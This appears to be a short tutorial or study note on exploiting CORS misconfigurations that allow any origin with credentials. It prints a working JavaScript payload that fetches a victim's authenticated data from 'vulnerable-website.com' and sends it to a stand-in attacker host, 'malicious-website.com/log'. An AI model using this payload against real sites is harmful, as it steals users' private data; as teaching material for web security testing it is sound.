Vulnerabilities arising from CORS configuration issues


If a response for a request contains a header Access-Control-Allow-Credentials then it may be an indicator that CORS is in use.

If the website allows any origin/domain to access/request, then deliver this payload:

var req = new XMLHttpRequest();

req.onload = reqListener;

req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);

req.withCredentials = true;

req.send();

function reqListener() {

location='//malicious-website.com/log?key='+this.responseText;

};

This will return any of the sensitive information contained in the response to the exploit server specified.

If there is a XSS vulnerable origin that is permissible, it can lead to CORS.
